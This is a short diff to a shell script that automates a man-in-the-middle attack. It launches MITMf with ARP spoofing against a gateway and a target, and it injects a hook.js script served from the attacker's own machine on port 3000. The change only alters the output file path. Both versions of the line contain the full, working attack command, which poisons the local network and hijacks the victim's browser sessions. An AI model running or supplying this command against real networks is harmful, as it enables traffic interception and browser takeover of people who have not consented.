@@ -32,7 +32,7 @@ xdg-open $xvar
 #here we would pass our site/target to mitmf
 echo "Starting MITMf ... "
 #mitmf output in moutput.txt
-mvar="mitmf --spoof --arp -i eth0 --gateway $router --target $target --inject --js-url http://$yours:3000/hook.js > /root/Desktop/moutput.txt"
+mvar="mitmf --spoof --arp -i eth0 --gateway $router --target $target --inject --js-url http://$yours:3000/hook.js > moutput.txt"
 echo $mvar
 eval $mvar
 
